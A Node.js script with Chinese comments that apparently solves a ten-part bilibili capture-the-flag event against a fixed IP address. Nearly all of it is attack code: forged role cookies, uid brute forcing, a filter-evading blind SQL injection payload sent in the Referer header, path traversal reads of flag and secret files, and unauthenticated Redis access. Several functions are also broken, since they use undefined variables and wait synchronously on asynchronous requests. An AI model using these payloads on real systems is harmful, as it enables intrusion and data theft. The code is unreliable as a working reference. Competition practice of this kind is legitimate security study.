const request = require("request");
const redis = require("redis");

let session = ""; // 此处填写个人 session

// 第一题 - 查源码 + 查请求
const func1 = function () {
  const config = {
    url: "http://45.113.201.36/api/admin",
    headers: {
      "User-Agent": "bilibili Security Browser",
      Cookie: `session=${session}`,
    },
    callback(error, response, body) {
      if (!error && response.statusCode == 200) {
        console.log("flag1:", body.data);
      }
    },
    request() {
      request(
        {
          url: this.url,
          headers: this.headers,
          json: true,
        },
        callback
      );
    },
  };

  config.request();
};

// 第二题 - 修改UA
const func2 = function () {
  const config = {
    url: "http://45.113.201.36/api/ctf/2",
    headers: {
      "User-Agent": "bilibili Security Browser",
      Cookie: `session=${session}`,
    },
    callback(error, response, body) {
      if (!error && response.statusCode == 200) {
        console.log("flag2:", body.data);
      }
    },
    request() {
      request(
        {
          url: this.url,
          headers: this.headers,
          json: true,
        },
        callback
      );
    },
  };

  config.request();
};

// 第三题
const func3 = function () {
  const config = {
    url: "http://45.113.201.36/api/ctf/3",
    role: "ee11cbb19052e40b07aac0ca060c23ee",
    headers: {
      "User-Agent": "bilibili Security Browser",
      Cookie: `role=${this.role}; session=${session};`,
    },
    callback(error, response, body) {
      if (!error && response.statusCode == 200) {
        console.log("flag3:", body.data);
      }
    },
    request() {
      request.post(
        {
          url: this.url,
          headers: this.headers,
          json: true,
        },
        callback
      );
    },
  };

  config.request();
};

// 第四题 - 修改Cookie - role
const func4 = function () {
  const config = {
    url: "http://45.113.201.36/api/ctf/4",
    role: "7b7bc2512ee1fedcd76bdc68926d4f7b", // 即 'Administrator' 的 MD5 字符串, 需要修改。
    headers: {
      "User-Agent": "bilibili Security Browser",
      Cookie: `role=${this.role}; session=${session};`,
    },
    callback(error, response, body) {
      if (!error && response.statusCode == 200) {
        console.log("flag4:", body.data);
      }
    },
    request() {
      request.post(
        {
          url: this.url,
          headers: this.headers,
          json: true,
        },
        callback
      );
    },
  };

  config.request();
};

// 第五题 - 暴力破解
const func5 = function () {
  const config = {
    uid: 100336889,
    get url() {
      return `http://45.113.201.36/api/ctf/5?uid=${uid}`;
    },
    role: "ee11cbb19052e40b07aac0ca060c23ee",
    headers: {
      "User-Agent": "bilibili Security Browser",
      Cookie: `role=${this.role}; session=${session};`,
    },
    callback(error, response, body) {
      if (!error && response.statusCode == 200) {
        if (body.flag === undefined) {
          uid++;
          request.post(
            {
              url,
              headers,
              json: true,
            },
            this.callback
          );
        } else {
          console.log("flag5:", body.data);
          return;
        }
      }
    },
    request() {
      request(
        {
          url: this.url,
          headers: this.headers,
          json: true,
        },
        callback
      );
    },
  };

  config.request();
};

// 第六题 - SQL注入
const func6 = function () {
  const config = {
    url: "http://45.113.201.36/blog/single.php?id=1",
    flag: "",
    role: "ee11cbb19052e40b07aac0ca060c23ee",
    headers: {
      "User-Agent": "bilibili Security Browser",
      Cookie: `role=${this.role}; session=${session};`,
    },
    callback(error, response, body) {
      if (!error && response.statusCode == 200) {
        console.log("flag4:", body.data);
      }
    },
    request() {
      for (let i = 1; i <= 100; i++) {
        let left = 33;
        let right = 128;

        while (right - left != 1) {
          let mid = Math.floor((left + right) / 2);
          let payload = `0123'^if(substr((selselectect flag from flag),${i},1)>binary ${mid.toString(
            16
          )},(selecselectt 1+~0),0) ununionion selecselectt 1,2#`;
          let headers = {
            Cookie: `role=${this.role}; session=${session};`,
            Referer: payload,
          };
          let callback = function (error, response, body) {
            if (!error && response.statusCode == 200) {
              if (body.data.length == 5596) {
                left = mid;
              } else {
                right = mid;
              }
            }
          };
          request(
            {
              url,
              headers,
              json: true,
            },
            callback
          );
        }
        flag = String.charCodeAt(right);
      }
      console.log("flag6:", flag);
    },
  };

  config.request();
};

// 第七题 - 任意文件读取
const func7 = function () {
  const config = {
    url: "http://45.113.201.36/api/images?file=../../../flag7.txt",
    role: "7b7bc2512ee1fedcd76bdc68926d4f7b",
    headers: {
      "User-Agent": "bilibili Security Browser",
      Cookie: `role=${this.role}; session=${session};`,
    },
    callback(error, response, body) {
      if (!error && response.statusCode == 200) {
        // 文件读取
      }
    },
    request() {
      request(
        {
          url,
          headers,
          json: true,
        },
        callback
      );
    },
  };

  config.request();
};

// 第八题 - 查Redis
const func8 = function () {
  const config = {
    get client() {
      return redis.createClient(6379, "45.113.201.36");
    },
    callback() {
      this.client.get("flag8", function (err, reply) {
        if (!err) {
          console.log(reply.toString());
        }
      });
    },
    connect() {
      this.client.on("connect", callback);
    },
  };

  config.connect();
};

// 第九题 - 任意文件读取 + 密钥解密
const func9 = function () {
  const config = {
    url: "http://45.113.201.36/api/images?file=../../../secret.txt",
    role: "ee11cbb19052e40b07aac0ca060c23ee",
    headers: {
      "User-Agent": "bilibili Security Browser",
      Cookie: `role=${this.role}; session=${this.session};`,
    },
    callback(error, response, body) {
      if (!error && response.statusCode == 200) {
        // 得到加密字符串，该字符串解密后即为 flag
      }
    },
    request() {
      request.post(
        {
          url: this.url,
          headers: this.headers,
          json: true,
        },
        this.callback
      );
    },
  };

  config.request();
};

// 第十题 - Meta Type
const func10 = function () {
  const config = {
    url: "http://45.113.201.36/blog/end.php?id[]=&url=flag.txt", // dirsearch 后，得知存在 /blog/test.php，返回内容为 jsfuck 编码的 JS 代码，转义后为var str1 = "程序员最多的地方"; var str2 = "bilibili1024havefun"; console.log()。Github 上找到对应仓库后根据提示得到该URL。
    role: "ee11cbb19052e40b07aac0ca060c23ee",
    headers: {
      "User-Agent": "bilibili Security Browser",
      Cookie: `role=${this.role}; session=${session};`,
    },
    callback(error, response, body) {
      if (!error && response.statusCode == 200) {
        // 得到加密字符串，该字符串解密后即为 flag
      }
    },
    request() {
      request.post(
        {
          url: this.url,
          headers: this.headers,
          json: true,
        },
        this.callback
      );
    },
  };

  config.request();
};

func1();
func2();
func3();
func4();
func5();
func6();
func7();
func8();
func9();
func10();
